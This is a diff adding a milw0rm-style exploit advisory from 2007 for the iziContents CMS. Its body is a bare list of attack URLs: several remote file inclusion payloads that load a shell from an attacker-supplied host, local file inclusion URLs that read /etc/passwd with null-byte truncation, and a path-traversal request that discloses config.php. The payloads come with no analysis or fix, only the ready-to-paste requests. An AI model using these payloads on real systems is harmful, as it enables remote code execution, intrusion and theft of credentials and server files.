@@ -1,0 +1,28 @@
+#                                      o      [bug]     /"*._         _        #
+#                 .                     .    .      .-*'`    `*-.._.-'/        #
+#                                   o       o     < * ))     ,       (         #
+#                            .           o          `*-._`._(__.--*"`.\        #
+#                                                                              #
+# vuln.: iziContents <= RC6 (RFI/LFI) Multiple Remote Vulnerabilities          #
+# author: irk4z@yahoo.pl                                                       #
+# download:                                                                    #
+#   http://www.izicontents.com/download/iziContents1RC6.zip                    #
+#                                                                              #
+# greetz: cOndemned, kacper ;>                                                 #
+
+
+# remote file inclusion:
+ http://[site]/[path]/modules/search/search.php?language_home=&rootdp=zZz&gsLanguage=http://[shell]?
+ http://[site]/[path]/modules/poll/inlinepoll.php?language_home=&rootdp=zZz&gsLanguage=http://[shell]?
+ http://[site]/[path]/modules/poll/showpoll.php?language_home=&rootdp=zZz&gsLanguage=http://[shell]?
+ http://[site]/[path]/modules/links/showlinks.php?language_home=&rootdp=zZz&gsLanguage=http://[shell]?
+ http://[site]/[path]/modules/links/submit_links.php?rootdp=zZz&gsLanguage=http://[shell]? 
+ 
+# local file inclusion:
+ http://[site]/[path]/modules/poll/poll_summary.php?rootdp=zZz&admin_home=/etc/passwd%00
+ http://[site]/[path]/include/db.php?rootdp=/etc/passwd%00
+ 
+# remote file disclosure:
+ http://[site]/[path]/include/tinymce/tiny_mce_gzip.php?theme=../../config.php%00
+
+# milw0rm.com [2007-09-21]
